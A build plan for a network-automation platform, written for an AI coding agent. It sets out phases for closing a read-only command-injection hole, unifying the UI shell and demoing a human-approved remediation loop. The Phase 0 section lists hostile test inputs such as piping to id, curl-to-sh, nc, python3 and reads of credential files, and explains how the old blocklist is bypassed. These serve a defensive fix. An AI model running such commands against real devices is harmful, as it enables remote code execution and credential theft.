# Netcode Platform — Unified Closed-Loop Build Plan (for Codex)

**Date:** 2026-07-07
**Extends:** `NETCODE_REZ_UNIFIED_ARCHITECTURE_PLAN_2026-07-06.md` (Rez repo) + `NETCODE_REZ_UNIFIED_PHASE_RESULTS_2026-07-07.md`.
**Grounded in:** validation this session (file:line verified). Reads GO where confirmed, NO-GO where a live exploit exists.

## North star (what we are building and why)
**Netcode Platform: closed-loop network automation with built-in diagnostics — human-approved.**
- The machine closes the loop of *work*: discover → plan → verify → (on failure) diagnose root cause with live read-only evidence → build the remediation.
- The human closes the loop of *decision*: **every write is behind an approval gate.** Self-diagnosing and self-planning — never self-changing.
- **Moat** = the closed loop (automation + read-only RCA + shared trust-boundary runner — hard to copy). **Hook** = a concrete failure-pain (OS upgrade / drift / bulk-change verification failure). **Proof** = a demo where the loop visibly closes.
- Brand/system-of-record/backend = **Netcode**. First UI surface = the **Rez React SPA** (it is the more mature multi-module shell). Rez chat-v2 becomes the "Diagnostics" module inside it.

## Invariants Codex must never break
1. **Writes are always human-approved.** The approval gate (requester ≠ approver), canary-first, and policy gates are load-bearing. No auto-apply, no auto-remediation-without-approval, ever, in the default path.
2. **Read/write separation is enforced at the runner by ACTION TYPE, not by caller.** `create_read_job` hard-prefixes `read_` (store.py:819) → read-only handler only; `create_job` (write path) is reachable only from the change pipeline. Do not add any bridge path that can mint a write job.
3. **Device credentials never transit the SaaS control plane.** Runner resolves creds from local inventory. The durable source-of-truth record holds only public facts.
4. **Read-only means read-only — proven, not asserted.** (See Phase 0.)

---

## PHASE 0 — BLOCKING: close the read-only RCE (nothing customer-facing ships until this is green)

**Why:** live-proven this session — through the "read-only" Rez bridge against lab EOS:
`show version | id` → `uid=…(admin) … groups=…,0(root)`; `show version | whoami` → `admin`. The device pipes any post-pipe token to `/bin/sh`. The current runner floor (`_pipe_segments_allowed` + `_POST_PIPE_BLOCKED`, runner_agent.py) is a **blocklist** — it blocks `bash`/`sh`/`python`/`tee`… but `| id`, `| cat /mnt/flash/startup-config` (credential exfil), `| curl x | sh`, `| tclsh`, `| python3` all pass. A blocklist against the infinite shell command space cannot work.

**Fix — convert to a post-pipe ALLOWLIST:**
- In `_pipe_segments_allowed` (netcode/runner_agent.py), after any `|`, require each segment's first token to be in a **read-only filter allowlist** and deny everything else:
  `{include, exclude, section, begin, count, json, no-more, nz, last, natural, match, except, display, trim}` (EOS + Junos read filters). Explicitly **not** allowed: `redirect|append|tee|save` (write files), and every shell command.
- Keep the existing separator blocks (`;`, `&`, backtick, `$(`, `>`, `<`, NUL, newline) and the first-verb allowlist.
- Apply the same floor to the interactive human shell's machine-issued path if it shares this device behavior (the human governed session is a separate risk acceptance, but the RCA/machine path must be airtight).

**Acceptance (regression battery — add as tests AND re-prove live through the bridge):**
- BLOCK: `show version | id`, `| whoami`, `| cat /etc/passwd`, `| curl http://x | sh`, `| nc …`, `| tclsh`, `| python3 -c x`, `| bash`, `| redirect flash:x`, `| tee f`, `| show run | id` (multi-pipe).
- ALLOW: `show version | include Software`, `show ip route | section bgp`, `show run | exclude !`, plain `show version`.
- Live re-prove: `show version | id` returns a block, not a uid.

**Gate:** Phase 0 must be green before Phase 1/2 are demoed to anyone external.

---

## PHASE 1 — One native product shell (the unification)

**Goal:** one product, one login, one discovery — not two apps.

**Decisions (validated):**
- **Host shell = the Rez React SPA** (`resonance-core/ui/`: React 19 + TS + Vite, ~25 feature modules, Auth/UserManagement/License, role-gated nav). Bring Netcode's automation views in as React feature modules; do **not** port the Rez UI into Netcode's hand-rolled vanilla-JS shell.
- **Backend/system-of-record = Netcode** (runner registry, auth/session/org, inventory, discovery, jobs, evidence, the `/api/rez/runner-read` bridge). Rez server becomes a diagnostics service behind Netcode's API.

**Work:**
1. One **auth/session** (Netcode's `NETCODE_AUTH`/sessions/org as the source of truth; the React shell authenticates against it).
2. One **environment/workspace selector**, one **runner registry** view.
3. One **discovery/inventory model** — Netcode discovery is the canonical entry; it writes the runner-local `inventory.yaml`; Rez reads the same file via the bridge in split mode (already wired). **Mandate split mode as the unified path** (non-split Rez reads a separate `rez_inventory.json` Netcode never touches).
4. Left-nav modules: **Discovery · Inventory · Automation (plan/gate/canary/apply/verify) · Diagnostics (Rez chat-v2) · Drift · Evidence/Rollback · Runner**.
5. Rez "Diagnostics" module receives shared context: `environment_id`, `runner_pool`, `device_id` (canonical), and the failed-change context when launched from a verification failure.

**Acceptance:** log in once → discover once → the discovered device is usable by both Automation and Diagnostics with no re-discovery; no second discovery screen; Diagnostics is a tab, not a separate app.

---

## PHASE 2 — Make the loop visibly close (the money demo)

**Goal:** the one demo no competitor can screen-record. Wire the closed loop end-to-end with the human gate intact.

**The loop (build the handoffs):**
1. Netcode change runs: plan → gate → canary → apply → **verify**.
2. **On verification failure**, auto-launch **Diagnostics** pre-loaded with the failed-change context (device, intent, expected-vs-actual, the verify evidence).
3. Diagnostics collects **live read-only** evidence through the runner and names the root cause.
4. Diagnostics produces a **remediation plan** — as a governed Netcode change (not a raw command).
5. **Human approves** the remediation (requester ≠ approver where regulated).
6. Re-apply through the same gates → verify → signed evidence. Loop closed.

**Acceptance / the demo script:** make a change that intentionally fails verification (e.g., a VLAN whose uplink trunk isn't allowed) → Diagnostics auto-engages, cites the exact failed condition from live evidence → generates the remediation → operator approves → re-apply → verify passes → evidence bundle. Record this as the 90-second demo. **The human-approval click stays in the demo — it's the differentiator, not a step to hide.**

---

## PHASE 3 — Enterprise-clean gaps (before pilot / security review)

From validation, still open:
1. **Credential end-state:** discovery/manual-add now reject cloud-submitted creds (HTTP 400 — confirmed). Finish the ideal: creds entered/resolved **only** on the runner; drop `username`/`password` from the two runner job payloads entirely (api.py discovery + manual-add) so nothing transits even transiently. Scrub `payload_json` on the cancel/timeout paths (store.py cancel functions currently don't).
2. **Device-state / topology contract:** state is shared live-over-the-bridge (same `DeviceStateV2`), but Netcode persists no snapshot and produces no topology. If the product promises "consume a discovered snapshot later" or topology from Netcode-discovered devices, build a persisted state contract + topology step. Otherwise scope it out explicitly.
3. **Node-id vs device.id:** stamp `node_id` = resolved device id in the runner state so Rez consumers that trust `node_id` don't mis-key. (Case/id normalization already fixed — confirmed live.)

---

## Deferred slices (do NOT block the demo/pilot on these)
- Full productization of the unified React shell (theming, all Netcode views ported).
- **Ansible executor pack** (runner-side, governed): must not bypass Netcode gates / check-mode-canary-verify-rollback / runner-local credentials. After native packs are certified.
- **Netcode Shell Desktop** (free Windows-first local terminal).
- **Graduated autonomy:** opt-in auto-remediation for specific low-blast-radius, pre-approved playbooks — earned, never default, never the pitch.

---

## Sequencing rule
**Phase 0 (RCE) → Phase 1 (one shell) → Phase 2 (loop demo) → Phase 3 (enterprise-clean).** Do not demo externally before Phase 0 is green. Do not call it "read-only" or pass it to a security review until the Phase 0 battery passes live. The closed-loop demo (Phase 2) is the highest-leverage artifact for GTM — prioritize the path that gets there with the human-approval gate visibly intact.

## What's already GO (don't rebuild)
- Read/write separation by action type at the runner. ✅
- Discover-once → shared inventory + device reads + live state (split mode). ✅
- Credential reject on discovery/manual-add (HTTP 400). ✅
- Case-insensitive inventory lookup. ✅
- Approval gate (requester ≠ approver), canary→batch→auto-halt, drift→remediation, signed evidence. ✅
